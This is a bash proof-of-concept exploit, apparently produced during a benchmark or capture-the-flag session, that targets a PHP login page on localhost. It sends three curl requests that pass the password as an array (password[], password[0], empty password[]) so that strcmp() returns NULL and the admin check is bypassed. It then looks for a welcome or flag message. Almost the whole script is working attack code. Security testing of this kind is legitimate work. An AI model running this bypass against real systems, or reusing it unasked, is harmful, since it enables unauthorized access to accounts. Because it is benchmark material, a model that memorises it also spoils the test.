#!/bin/bash
# POC: Demonstrates type confusion authentication bypass using array parameter to bypass strcmp() function validation
# Target: ./repo
# Created: 2025-11-07T18:33:15.567Z
# Session: benchmark-XBEN-055-24-mhp6srme

# Type Confusion Authentication Bypass via Array Parameter POC
# Exploits strcmp() type juggling vulnerability when password is submitted as array
# The strcmp() function returns NULL when given an array, which evaluates to false

TARGET="http://localhost:3000"
ENDPOINT="/index.php"

echo "================================================"
echo "Type Confusion Authentication Bypass POC"
echo "================================================"
echo ""

# Test 1: Authentication bypass with password[] array notation
echo "[*] Test 1: Attempting auth bypass with password[] array notation"
echo "[*] URL: $TARGET$ENDPOINT?username=admin&password[]=test"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?username=admin&password[]=test")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check for success indicators
if echo "$BODY" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS! Authentication bypassed - Found 'Welcome Admin' message"
    echo "[+] VULNERABLE to type confusion attack"
    exit 0
elif echo "$BODY" | grep -q "Congratulations"; then
    echo "[+] SUCCESS! Authentication bypassed - Found flag message"
    echo "[+] VULNERABLE to type confusion attack"
    exit 0
else
    echo "[-] Test 1 failed - trying alternative notation"
    echo ""
    
    # Test 2: Try password[0] notation
    echo "[*] Test 2: Attempting auth bypass with password[0] array notation"
    echo "[*] URL: $TARGET$ENDPOINT?username=admin&password[0]=test"
    echo ""
    
    RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?username=admin&password[0]=test")
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    echo "[*] HTTP Status Code: $HTTP_CODE"
    echo ""
    
    if echo "$BODY" | grep -q "Welcome Admin"; then
        echo "[+] SUCCESS! Authentication bypassed with password[0]"
        echo "[+] VULNERABLE to type confusion attack"
        exit 0
    elif echo "$BODY" | grep -q "Congratulations"; then
        echo "[+] SUCCESS! Authentication bypassed with password[0]"
        echo "[+] VULNERABLE to type confusion attack"
        exit 0
    else
        echo "[-] Test 2 failed - trying empty array notation"
        echo ""
        
        # Test 3: Try empty array notation
        echo "[*] Test 3: Attempting auth bypass with password[] (empty array)"
        echo "[*] URL: $TARGET$ENDPOINT?username=admin&password[]"
        echo ""
        
        RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?username=admin&password[]")
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | head -n -1)
        
        echo "[*] HTTP Status Code: $HTTP_CODE"
        echo ""
        
        if echo "$BODY" | grep -q "Welcome Admin"; then
            echo "[+] SUCCESS! Authentication bypassed with empty array"
            echo "[+] VULNERABLE to type confusion attack"
            exit 0
        elif echo "$BODY" | grep -q "Congratulations"; then
            echo "[+] SUCCESS! Authentication bypassed with empty array"
            echo "[+] VULNERABLE to type confusion attack"
            exit 0
        fi
    fi
fi

echo "[-] All tests failed - application may not be vulnerable"
exit 1